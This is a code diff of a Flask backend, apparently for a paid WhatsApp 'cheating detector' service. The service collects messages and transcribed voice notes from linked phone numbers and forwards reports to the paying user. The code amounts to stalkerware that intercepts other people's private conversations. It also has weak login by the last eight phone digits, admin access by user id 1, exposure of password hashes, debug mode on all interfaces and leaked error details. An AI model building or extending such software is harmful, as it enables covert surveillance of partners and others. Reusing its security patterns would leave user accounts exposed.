@@ -54,7 +54,7 @@ def login():
         password = request.form['password']
         conn = get_db()
         cur = conn.cursor()
-        cur.execute("SELECT id, username, password FROM usuarios WHERE username = %s", (username,))
+        cur.execute("SELECT id, username, password FROM usuarios WHERE RIGHT(whatsapp_pai, 8) = %s", (username[-8:],))
         row = cur.fetchone()
         conn.close()
         if row and check_password_hash(row[2], password):
@@ -68,28 +68,32 @@ def login():
 def register():
     if request.method == 'POST':
         username = request.form['username']
-        password = generate_password_hash(request.form['password'])
         whatsapp_pai = request.form['whatsapp_pai'].strip()
+        password = request.form['password']
+        confirm_password = request.form['confirm_password']
 
-        # Normalizar o número do whatsapp_pai
+        # Validar senha
+        if password != confirm_password:
+            return render_template('register.html', erro="As senhas não coincidem.")
+        if not re.match(r'^(?=.*[A-Z])(?=.*\d).{8,}$', password):
+            return render_template('register.html', erro="A senha deve ter pelo menos 8 caracteres, com 1 letra maiúscula e 1 número.")
+
+        password_hash = generate_password_hash(password)
         numero = whatsapp_pai
         if numero.startswith('+55'):
             numero = numero[3:]
         elif numero.startswith('55'):
             numero = numero[2:]
 
-        # Validar o número
         if not re.match(r'^\d{10,11}$', numero):
             return render_template('register.html', erro="Número de WhatsApp inválido. Use o formato com DDD (ex: 5512345678900 ou +5512345678900).")
 
-        # Criar três variações do número
         ddd = numero[:2]
         resto = numero[2:]
         numero_com_9 = f"{ddd}9{resto}" if len(resto) == 8 else numero
         numero_sem_9 = f"{ddd}{resto[1:]}" if len(resto) == 9 and resto[0] == '9' else numero
         numero_original = numero
 
-        # Adicionar +55 às variações
         numeros_para_confirmacao = [
             f"+55{numero_com_9}",
             f"+55{numero_sem_9}",
@@ -99,14 +103,15 @@ def register():
         try:
             conn = get_db()
             cur = conn.cursor()
-            cur.execute("INSERT INTO usuarios (username, password, plano, whatsapp_pai, telefones_monitorados, confirmado, data_criacao) VALUES (%s, %s, %s, %s, %s, %s, %s)",
-                        (username, password, 'Gratuito', f"+55{numero_original}", [], False, datetime.now()))
+            cur.execute(
+                "INSERT INTO usuarios (username, password, plano, whatsapp_pai, telefones_monitorados, confirmado, data_criacao) VALUES (%s, %s, %s, %s, %s, %s, %s)",
+                (username, password_hash, 'Gratuito', f"+55{numero_original}", [], False, datetime.now())
+            )
             conn.commit()
             conn.close()
         except psycopg2.IntegrityError:
             return render_template('register.html', erro="Usuário já existe.")
 
-        # Enviar mensagens de confirmação
         for num in set(numeros_para_confirmacao):
             try:
                 confirmacao_url = f"https://detectordetraicao.digital/confirmar-numero/{num}"
@@ -159,7 +164,6 @@ def logout():
 def painel():
     conn = get_db()
     cur = conn.cursor()
-
     cur.execute("SELECT plano, telefones_monitorados, whatsapp_pai, confirmado, data_criacao FROM usuarios WHERE id = %s", (current_user.id,))
     row = cur.fetchone()
     conn.close()
@@ -178,29 +182,23 @@ def painel():
     }
     max_filhos = limites.get(plano, 1)
 
-    mensagem_confirmacao = None
-    if not confirmado:
-        mensagem_confirmacao = "Por favor, clique no link enviado ao seu WhatsApp para confirmar seu número."
-
+    mensagem_confirmacao = None if confirmado else "Por favor, clique no link enviado ao seu WhatsApp para confirmar seu número."
     dias_restantes = None
-    mensagem_compra = None
-    if plano == "Gratuito" and data_criacao:
+    comprar_agora = False
+    if plano == "Gratuito":
         dias_passados = (datetime.now() - data_criacao).days
         dias_restantes = max(0, 2 - dias_passados)
-        if dias_restantes == 0:
-            mensagem_compra = "Seu teste gratuito expirou! Compre agora: R$ 38,90/mês (1 celular) ou R$ 99,70/mês (3 celulares)."
+        comprar_agora = dias_restantes == 0
 
-    qr_code = None
     return render_template(
         "painel.html",
         session_id=whatsapp_pai,
         plano=plano,
         filhos=filhos,
         max_filhos=max_filhos,
-        qr_code=qr_code,
         mensagem_confirmacao=mensagem_confirmacao,
         dias_restantes=dias_restantes,
-        mensagem_compra=mensagem_compra
+        comprar_agora=comprar_agora
     )
 
 @app.route("/excluir-filho/<int:filho_id>", methods=["POST"])
@@ -208,7 +206,6 @@ def painel():
 def excluir_filho(filho_id):
     conn = get_db()
     cur = conn.cursor()
-
     cur.execute("SELECT telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
     resultado = cur.fetchone()
     if not resultado:
@@ -230,10 +227,10 @@ def excluir_filho(filho_id):
             print(f"Sessão excluída para {numero_filho}: {response.text}")
         except Exception as e:
             print(f"Erro ao excluir sessão para {numero_filho}: {str(e)}")
-            cur.execute("""
-                INSERT INTO log_erros (usuario_id, erro, data)
-                VALUES (%s, %s, %s)
-            """, (current_user.id, f"Erro ao excluir sessão: {str(e)}", datetime.now()))
+            cur.execute(
+                "INSERT INTO log_erros (usuario_id, erro, data) VALUES (%s, %s, %s)",
+                (current_user.id, f"Erro ao excluir sessão: {str(e)}", datetime.now())
+            )
             conn.commit()
 
     conn.close()
@@ -248,35 +245,53 @@ def adicionar_filho():
     if not re.match(r"^\+\d{12,13}$", numero):
         conn = get_db()
         cur = conn.cursor()
-        cur.execute("SELECT plano, telefones_monitorados, data_criacao FROM usuarios WHERE id = %s", (current_user.id,))
+        cur.execute("SELECT plano, telefones_monitorados, whatsapp_pai, confirmado, data_criacao FROM usuarios WHERE id = %s", (current_user.id,))
         resultado = cur.fetchone()
         plano = resultado[0]
         filhos = resultado[1] or []
+        session_id = resultado[2]
+        confirmado = resultado[3]
+        data_criacao = resultado[4]
         conn.close()
+        limites = {"Gratuito": 1, "Pro": 1, "Premium": 3}
+        max_filhos = limites.get(plano, 1)
+        dias_passados = (datetime.now() - data_criacao).days
+        dias_restantes = max(0, 2 - dias_passados) if plano == "Gratuito" else None
+        comprar_agora = dias_restantes == 0 if plano == "Gratuito" else False
         return render_template(
             "painel.html",
             erro="Número inválido. Use o formato internacional (ex: +5512345678900).",
-            session_id=current_user.username,
+            session_id=session_id,
             plano=plano,
             filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
-            max_filhos=limites.get(plano, 1),
-            qr_code=None
+            max_filhos=max_filhos,
+            mensagem_confirmacao=None if confirmado else "Por favor, clique no link enviado ao seu WhatsApp para confirmar seu número.",
+            dias_restantes=dias_restantes,
+            comprar_agora=comprar_agora
         )
 
     conn = get_db()
     cur = conn.cursor()
-
-    cur.execute("SELECT plano, telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
+    cur.execute("SELECT plano, telefones_monitorados, data_criacao FROM usuarios WHERE id = %s", (current_user.id,))
     resultado = cur.fetchone()
     plano = resultado[0]
     filhos = resultado[1] or []
+    data_criacao = resultado[2]
 
-    limites = {
-        "Gratuito": 1,
-        "Pro": 1,
-        "Premium": 3
-    }
+    limites = {"Gratuito": 1, "Pro": 1, "Premium": 3}
     max_filhos = limites.get(plano, 1)
+
+    if plano == "Gratuito" and (datetime.now() - data_criacao).days > 2:
+        conn.close()
+        return render_template(
+            "painel.html",
+            erro="Período de teste gratuito expirado. Faça upgrade para continuar.",
+            session_id=current_user.username,
+            plano=plano,
+            filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
+            max_filhos=max_filhos,
+            comprar_agora=True
+        )
 
     if len(filhos) >= max_filhos:
         conn.close()
@@ -287,7 +302,7 @@ def adicionar_filho():
             plano=plano,
             filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
             max_filhos=max_filhos,
-            qr_code=None
+            comprar_agora=plano == "Gratuito" and (datetime.now() - data_criacao).days > 2
         )
 
     if numero in filhos:
@@ -299,7 +314,7 @@ def adicionar_filho():
             plano=plano,
             filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
             max_filhos=max_filhos,
-            qr_code=None
+            comprar_agora=plano == "Gratuito" and (datetime.now() - data_criacao).days > 2
         )
 
     filhos.append(numero)
@@ -322,7 +337,6 @@ def status_conexao():
     try:
         numeros = request.json.get("numeros", [])
         status_resultados = {}
-
         for numero in numeros:
             if not numero.startswith("+"):
                 numero = f"+{numero}"
@@ -332,7 +346,6 @@ def status_conexao():
                 status_resultados[numero] = dados.get("conectado", False)
             except:
                 status_resultados[numero] = False
-
         return jsonify(status_resultados)
     except Exception as e:
         return jsonify({"erro": str(e)}), 500
@@ -363,27 +376,22 @@ def mensagem_recebida():
             return jsonify({"erro": "arquivo de áudio não encontrado"}), 400
 
         audio_file = request.files["audio"]
-
         try:
             with tempfile.NamedTemporaryFile(delete=False, suffix=".ogg") as temp:
                 audio_path = temp.name
                 audio_file.save(audio_path)
-
             with open(audio_path, "rb") as f:
                 transcription = client.audio.transcriptions.create(
                     model="whisper-1",
                     file=f,
                     response_format="text"
                 )
-
             conteudo = transcription.strip()
-
         except Exception as e:
             return jsonify({"erro": f"falha ao transcrever áudio: {str(e)}"}), 500
         finally:
             if os.path.exists(audio_path):
                 os.remove(audio_path)
-
     else:
         data = request.get_json()
         numero_filho = '+' + data.get("para").strip('@s.whatsapp.net')
@@ -408,16 +416,13 @@ def mensagem_recebida():
 
     conn = get_db()
     cur = conn.cursor()
-
     if numero_filho != '+556792342051':
-        cur.execute("""
-            INSERT INTO mensagens_monitoradas (
-                numero_filho, tipo, numero_contato, conteudo, horario
-            ) VALUES (%s, %s, %s, %s, %s)
-        """, (numero_filho, tipo, numero_contato, conteudo, horario))
+        cur.execute(
+            "INSERT INTO mensagens_monitoradas (numero_filho, tipo, numero_contato, conteudo, horario) VALUES (%s, %s, %s, %s, %s)",
+            (numero_filho, tipo, numero_contato, conteudo, horario)
+        )
         conn.commit()
-        conn.close()
-
+    conn.close()
     return jsonify({"status": "mensagem salva com sucesso"})
 
 @app.route("/disparar-relatorios", methods=["GET"])
@@ -426,31 +431,24 @@ def disparar_relatorios():
     try:
         conn = get_db()
         cur = conn.cursor()
-
         cur.execute("SELECT id, whatsapp_pai, telefones_monitorados, plano, data_criacao FROM usuarios WHERE whatsapp_pai IS NOT NULL")
         usuarios = cur.fetchall()
 
         for user_id, whatsapp_pai, telefones_monitorados, plano, data_criacao in usuarios:
             if not telefones_monitorados:
                 continue
-
-            # Verificar se o plano gratuito expirou
-            if plano == "Gratuito" and data_criacao:
-                dias_passados = (datetime.now() - data_criacao).days
-                if dias_passados > 2:
-                    continue  # Não enviar relatórios se o teste gratuito expirou
+            if plano == "Gratuito" and (datetime.now() - data_criacao).days > 2:
+                continue  # Ignora usuários com teste gratuito expirado
 
             for numero_filho in telefones_monitorados:
                 if not numero_filho.startswith("+"):
                     numero_filho = f"+{numero_filho}"
                 ultimos_8 = numero_filho[-8:]
-                cur.execute("""
-                    SELECT conteudo, horario FROM mensagens_monitoradas
-                    WHERE RIGHT(numero_filho, 8) = %s
-                    ORDER BY horario DESC
-                """, (ultimos_8,))
+                cur.execute(
+                    "SELECT conteudo, horario FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s ORDER BY horario DESC",
+                    (ultimos_8,)
+                )
                 mensagens = cur.fetchall()
-
                 if not mensagens:
                     continue
 
@@ -467,56 +465,67 @@ def disparar_relatorios():
                         "mensagem": corpo
                     }, timeout=10)
                     response.raise_for_status()
-                    cur.execute("""
-                        DELETE FROM mensagens_monitoradas
-                        WHERE RIGHT(numero_filho, 8) = %s
-                    """, (ultimos_8,))
+                    cur.execute(
+                        "DELETE FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s",
+                        (ultimos_8,)
+                    )
                     conn.commit()
                 except Exception as e:
-                    cur.execute("""
-                        INSERT INTO log_erros (usuario_id, erro, data)
-                        VALUES (%s, %s, %s)
-                    """, (user_id, str(e), datetime.now()))
+                    cur.execute(
+                        "INSERT INTO log_erros (usuario_id, erro, data) VALUES (%s, %s, %s)",
+                        (user_id, str(e), datetime.now())
+                    )
                     conn.commit()
-
         return jsonify({"status": "relatórios processados"})
     except Exception as e:
-        print(f"Erro interno na rota /disparar-relatorios: {str(e)}")
         return jsonify({"erro": "Erro interno no servidor", "detalhes": str(e)}), 500
     finally:
         if conn:
             conn.close()
 
-@app.route('/admin', methods=['GET', 'POST'])
+@app.route("/admin", methods=["GET", "POST"])
 @login_required
 def admin():
-    # Simples verificação de admin (pode ser reforçada com uma coluna is_admin na tabela usuarios)
-    if current_user.username != "admin":
+    if current_user.id != 1:  # Apenas usuário com ID 1 é admin
         return jsonify({"erro": "Acesso não autorizado"}), 403
 
     conn = get_db()
     cur = conn.cursor()
+    if request.method == "POST":
+        usuarios = request.form.getlist("id[]")
+        usernames = request.form.getlist("username[]")
+        passwords = request.form.getlist("password[]")
+        planos = request.form.getlist("plano[]")
+        whatsapp_pais = request.form.getlist("whatsapp_pai[]")
+        telefones_monitorados = request.form.getlist("telefones_monitorados[]")
+        confirmados = request.form.getlist("confirmado[]")
+        datas_criacao = request.form.getlist("data_criacao[]")
 
-    if request.method == 'POST':
-        user_id = request.form['id']
-        username = request.form['username']
-        plano = request.form['plano']
-        whatsapp_pai = request.form['whatsapp_pai']
-        confirmado = request.form['confirmado'] == 'True'
-        telefones_monitorados = request.form.getlist('telefones_monitorados[]')
+        for i in range(len(usuarios)):
+            user_id = usuarios[i]
+            username = usernames[i]
+            if not username:  # Excluir usuário se username estiver vazio
+                cur.execute("DELETE FROM usuarios WHERE id = %s", (user_id,))
+                continue
+            password = generate_password_hash(passwords[i]) if passwords[i] else None
+            plano = planos[i] if planos[i] in ["Gratuito", "Pro", "Premium"] else "Gratuito"
+            whatsapp_pai = whatsapp_pais[i]
+            telefones = telefones_monitorados[i].split(",") if telefones_monitorados[i] else []
+            confirmado = confirmados[i] == "True"
+            data_criacao = datas_criacao[i] or datetime.now()
 
-        cur.execute("""
-            UPDATE usuarios
-            SET username = %s, plano = %s, whatsapp_pai = %s, confirmado = %s, telefones_monitorados = %s
-            WHERE id = %s
-        """, (username, plano, whatsapp_pai, confirmado, telefones_monitorados, user_id))
+            cur.execute(
+                "UPDATE usuarios SET username = %s, password = %s, plano = %s, whatsapp_pai = %s, telefones_monitorados = %s, confirmado = %s, data_criacao = %s WHERE id = %s",
+                (username, password, plano, whatsapp_pai, telefones, confirmado, data_criacao, user_id)
+            )
         conn.commit()
+        conn.close()
+        return redirect(url_for("admin"))
 
-    cur.execute("SELECT id, username, plano, whatsapp_pai, confirmado, telefones_monitorados, data_criacao FROM usuarios")
+    cur.execute("SELECT id, username, password, plano, whatsapp_pai, telefones_monitorados, confirmado, data_criacao FROM usuarios")
     usuarios = cur.fetchall()
     conn.close()
-
-    return render_template('admin.html', usuarios=usuarios)
+    return render_template("admin.html", usuarios=usuarios)
 
 if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=5000)
